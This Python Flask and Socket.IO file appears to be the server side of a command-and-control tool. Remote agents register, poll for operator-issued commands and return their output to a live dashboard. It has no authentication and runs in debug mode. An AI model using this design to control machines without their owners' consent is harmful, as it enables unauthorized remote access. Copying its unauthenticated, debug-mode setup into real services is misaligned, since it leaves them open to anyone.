from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO,emit

app = Flask(__name__)
socketio = SocketIO(app)

# Store commands for each agent
agents = {}

# Default route to render index.html
@app.route('/')
def index():
    return render_template('index.html')

# Endpoint for agents to register
@app.route('/register', methods=['POST'])
def register_agent():
    agent_id = request.form.get('agent_id')
    if agent_id:
        agents[agent_id] = {'command': ''}
        socketio.emit('agent_registered', {'agent': agent_id})
        return jsonify({'message': 'Agent registered successfully'}), 200
    else:
        return jsonify({'error': 'Agent registration failed: Missing agent_id'}), 400
    

# Endpoint for users to send commands to agents
@app.route('/send_command', methods=['POST'])
def send_command():
    agent_id = request.form.get('agent_id')
    command = request.form.get('command')
    if agent_id in agents:
        agents[agent_id]['command'] = command
        return jsonify({'message': 'Command sent successfully'}), 200
    else:
        return jsonify({'error': 'Agent not found'}), 404

# Endpoint for agents to get commands from the server
@app.route('/get_command', methods=['GET'])
def get_command():
    agent_id = request.args.get('agent_id')
    if agent_id in agents:
        command = agents[agent_id]['command']
        return jsonify({'command': command}), 200
    else:
        return jsonify({'error': 'Agent not found'}), 404

# Endpoint for agents to send output back to the server
@app.route('/send_output', methods=['POST'])
def send_output():
    agent_id = request.form.get('agent_id')
    output = request.form.get('output')
    if agent_id in agents:
        agents[agent_id]['output'] = output
        socketio.emit('output_update', {'output': output})  # Emit output to client
        return jsonify({'message': 'Output received successfully'}), 200
    else:
        return jsonify({'error': 'Agent not found'}), 404

# Endpoint to return a list of registered agents
@app.route('/agents', methods=['GET'])
def get_agents():
    return jsonify({'agents': list(agents.keys())}), 200

if __name__ == '__main__':
    socketio.run(app, debug=True, port=5001,allow_unsafe_werkzeug=True)
